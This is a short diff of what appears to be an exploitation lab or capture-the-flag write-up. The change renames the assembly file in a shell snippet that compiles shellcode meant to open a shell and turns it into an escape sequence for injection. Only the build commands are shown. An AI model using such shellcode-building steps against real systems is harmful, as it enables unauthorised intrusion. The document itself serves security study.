@@ -91,7 +91,7 @@ We wish for it to open a shell once executed.
 We defined this behaviour in [shellcode.asm](./Ressources/data/shellcode.asm) but it must be converted into a little-endian octal escape sequence for practical reasons.
 ```sh
 $ tmpdir=$(mktemp -d);
-$ asm_payload_filepath="./data/exploit.asm";
+$ asm_payload_filepath="./data/shellcode.asm";
 # Compile the assembly program to an object file.
 $ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
 # Link the object file into a binary.
